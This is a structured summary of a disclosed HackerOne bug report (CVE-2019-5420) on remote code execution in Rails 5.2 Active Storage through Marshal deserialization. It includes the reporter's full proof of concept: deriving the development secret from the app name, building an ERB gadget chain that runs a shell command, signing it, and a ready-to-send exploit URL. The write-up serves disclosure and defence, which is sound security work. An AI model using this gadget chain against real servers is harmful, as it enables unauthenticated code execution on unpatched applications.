# Remote Code Execution via ActiveSupport::MessageVerifier/MessageEncryptor Marshal Deserialization in Active Storage

## Metadata
- **Source:** HackerOne
- **Report:** 473888 | https://hackerone.com/reports/473888
- **Submitted:** 2019-01-02
- **Reporter:** ooooooo_q
- **Program:** Rails/Ruby on Rails
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Insecure Deserialization, Object Injection, Remote Code Execution
- **CVEs:** CVE-2019-5420
- **Category:** memory-binary

## Summary
ActiveSupport::MessageVerifier and ActiveSupport::MessageEncryptor use Marshal as the default serializer, which is vulnerable to object injection attacks. Rails 5.2+ uses these classes in Active Storage for URL validation, allowing unauthenticated attackers to achieve RCE by crafting malicious serialized payloads.

## Attack scenario
1. Attacker discovers Rails application using Active Storage (5.2+) with exposed routes like /rails/active_storage/disk/:encoded_key
2. Attacker derives the secret_key_base through known application name and standard Rails key generation
3. Attacker creates a malicious Marshal-serialized object (e.g., ERB gadget chain) embedding arbitrary code
4. Attacker signs the payload using the derived secret to create a valid MessageVerifier signature
5. Attacker sends HTTP request with crafted encoded_key parameter containing the malicious payload
6. Rails deserializes the payload using Marshal.load(), triggering RCE during object instantiation

## Root cause
Marshal.load() is inherently unsafe for untrusted data as it can instantiate arbitrary Ruby objects and execute code during deserialization. Using Marshal as the default serializer in MessageVerifier/MessageEncryptor without explicit user opt-in to JSON creates an exploitable gadget chain vulnerability.

## Attacker mindset
An attacker with knowledge of Rails internals recognizes that Active Storage endpoints are publicly accessible and that the verifier secret can be derived from static information (app name + standard key derivation). They leverage Ruby's Marshal gadget chains (ERB, Gem::Installer, etc.) to achieve code execution without authentication.

## Defensive takeaways
- Change serializer from Marshal to JSON in MessageVerifier/MessageEncryptor initialization
- Implement strict allowlist for deserialized object types if Marshal must be used
- Avoid deriving secrets from predictable sources; use randomly generated secrets in production
- Apply strict authentication and authorization checks on Active Storage endpoints
- Monitor and alert on deserialization errors or unexpected object instantiation
- Upgrade to patched Rails versions that default to JSON serialization
- Use explicit serializer parameter rather than relying on insecure defaults
- Implement Content Security Policy and other defense-in-depth controls

## Variant hunting
Check for other Rails classes using MessageVerifier/MessageEncryptor with default serializers
Identify custom Rails applications that instantiate these classes without explicit serializer configuration
Search for gadget chains in common gems beyond ERB (Gem::Installer, Gem::RequestSet, etc.)
Test Active Storage alternatives and file handling implementations for similar patterns
Examine cookie signing mechanisms that may use MessageVerifier with untrusted source
Review session storage implementations for deserialization vulnerabilities

## MITRE ATT&CK
- T1190
- T1203
- T1565
- T1046

## Notes
This vulnerability is particularly severe because: (1) Active Storage routes are enabled by default in Rails 5.2+, (2) no authentication is required to access them, (3) the secret can potentially be derived or brute-forced, (4) Marshal gadget chains are well-documented in security research. The report demonstrates the exploit is practical and not theoretical. Rails ultimately addressed this by changing the default serializer to JSON in later versions, but applications on affected versions remain vulnerable.

## Full report
<details><summary>Expand</summary>

Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.


```ruby
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110
    def initialize(secret, options = {})
      raise ArgumentError, "Secret should not be nil." unless secret
      @secret = secret
      @digest = options[:digest] || "SHA1"
      @serializer = options[:serializer] || Marshal
    end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145
def initialize(secret, *signature_key_or_options)
  options = signature_key_or_options.extract_options!
  sign_secret = signature_key_or_options.first
  @secret = secret
  @sign_secret = sign_secret
  @cipher = options[:cipher] || self.class.default_cipher
  @digest = options[:digest] || "SHA1" unless aead_mode?
  @verifier = resolve_verifier
  @serializer = options[:serializer] || Marshal
end
```

Especially in Rails 5.2 and later, `ActiveSupport::MessageVerifier` is used to validate the URL used in Active Storage, and attacks are possible.


```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81
initializer "active_storage.verifier" do
  config.after_initialize do |app|
    ActiveStorage.verifier = app.message_verifier("ActiveStorage")
  end
end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38
def decode_verified_key
  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)
end
```

It is also used in `ActiveStorage::Blob.find_signed`.
Also, these URLs can be accessed without using Active Storage.

### PoC

#### 1. Prepare server

```
$ ruby -v
ruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]

$ rails -v
Rails 5.2.2

$ rails new verifier_rce
$ cd verifier_rce/
$ bundle install
```

```
# Active Storage is not installed, but routes is usable
$ bin/rails routes
Prefix Verb URI Pattern                                                                              Controller#Action
rails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show
rails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show
rails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show
update_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update
rails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create
```

#### 2. Prepare payload

```ruby
$ ls /tmp/rce
ls: /tmp/rce: No such file or directory

$ bundle exec rails console
Running via Spring preloader in process 66998
Loading development environment (Rails 5.2.2)

irb(main):001:0> # emulate verifier
=> nil
irb(main):002:0> app_class_name = VerifierRce::Application.name
=> "VerifierRce::Application"
irb(main):003:0> secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)
=> "7e485df67863e85e584b3feecb22276d"
irb(main):004:0> key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
=> #<ActiveSupport::CachingKeyGenerator:0x00007ff55ac60d48 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff55ac60d98 @secret="7e485df67863e85e584b3feecb22276d", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff55ac60cf8 entries=0 default_proc=nil>>
irb(main):005:0> secret = key_generator.generate_key("ActiveStorage")
=> "\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,"
irb(main):006:0> verifier = ActiveSupport::MessageVerifier.new(secret)
=> #<ActiveSupport::MessageVerifier:0x00007ff558aaee20 @secret="\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,", @digest="SHA1", @serializer=Marshal, @options={}, @rotations=[]>
irb(main):007:0>


irb(main):008:0> # https://medium.com/@u0x/marshall-unserialization-exploit-for-ruby-on-rails-5-1-4-979475cfdba0
=> nil
irb(main):009:0> code = '`touch /tmp/rce`'
=> "`touch /tmp/rce`"
irb(main):010:0> erb = ERB.allocate
=> #<ERB:0x00007ff55acabdc0>
irb(main):011:0> erb.instance_variable_set :@src, code
=> "`touch /tmp/rce`"
irb(main):012:0> erb.instance_variable_set :@filename, "1"
=> "1"
irb(main):013:0> erb.instance_variable_set :@lineno, 1
=> 1
irb(main):014:0> dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
=> ""
irb(main):015:0>

irb(main):016:0> verifier.generate(dump_target, purpose: :blob_key)
=> "eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d"
```

```
# Confirm that the file was generated due to the side effect of creating payload
$ ls /tmp/rce
/tmp/rce

# Erase the file as it disturbs the operation check
$ rm /tmp/rce
$ ls /tmp/rce
ls: /tmp/rce: No such file or directory
```

#### 3. Attack

Start server.

```
$ bin/rails s
```

Open URL in browser.
(`GET  /rails/active_storage/disk/:encoded_key/*filename`, use payload for `:encoded_key`)

```
http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test
```

Confirm that the file was created.

```
$ ls /tmp/rce
/tmp/rce
```

## Impact

If the server is running in development mode with version 5.2 or later, if the attacker can know application name, `secret_key_base` can be obtained, so RCE can be easily done by accessing the URL.
In production mode, an attacker needs to know `secret_key_base`.

For versions less than 5.2, attacks are possible only if the user is able to input places using `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` and the attacker knows `secret_key_base`.

### proposed measures

- Use `JSON.load` or `Yaml.safe_load` without using Marshal
- Disable access to URL if Active Storage is not used

</details>

---
*Analysed by Claude on 2026-05-12*
